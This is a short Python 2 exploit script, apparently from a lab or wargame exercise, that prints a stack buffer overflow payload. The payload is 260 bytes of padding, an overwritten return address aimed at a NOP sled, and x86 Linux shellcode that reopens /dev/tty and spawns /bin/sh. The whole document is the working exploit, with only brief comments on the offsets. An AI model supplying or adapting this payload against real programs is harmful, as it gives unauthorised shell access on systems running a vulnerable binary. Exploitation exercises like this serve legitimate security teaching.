import struct
pad = "\x41" * 260 # buffer overflow at 260= 256 buf + 4 (EBP)
EIP = struct.pack("I", 0xbffff559) # EIP was at 0xbffff555, we are override it to point next 4 bytes, this suppose to at NOP 
shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
NOP = "\x90" * 100
print pad + EIP + NOP + shellcode
